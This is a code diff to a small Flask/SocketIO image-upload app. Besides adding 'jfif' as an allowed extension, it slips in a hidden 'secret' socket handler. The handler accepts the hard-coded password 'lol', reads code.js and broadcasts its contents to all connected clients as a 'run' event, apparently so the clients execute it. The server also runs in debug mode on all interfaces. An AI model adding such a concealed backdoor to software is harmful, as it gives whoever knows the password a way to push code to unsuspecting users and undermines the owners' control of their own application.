@@ -2,7 +2,7 @@ from flask import Flask, render_template, request, redirect, url_for
 from flask_socketio import SocketIO
 from requests import get
 
-ACCEPTABLE_FILENAMES = ['png', 'jpg', 'jpeg', 'gif']
+ACCEPTABLE_FILENAMES = ['png', 'jpg', 'jpeg', 'gif', 'jfif']
 
 app = Flask(__name__)
 socketio = SocketIO(app)
@@ -25,6 +25,12 @@ def upload_file():
                 file.write(r.content)
     return redirect('..')
 
+@socketio.on('secret')
+def secret(password):
+    if password == 'lol':
+        with open('code.js') as file:
+            code = file.read()
+            socketio.emit('run', code)
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', debug=True)
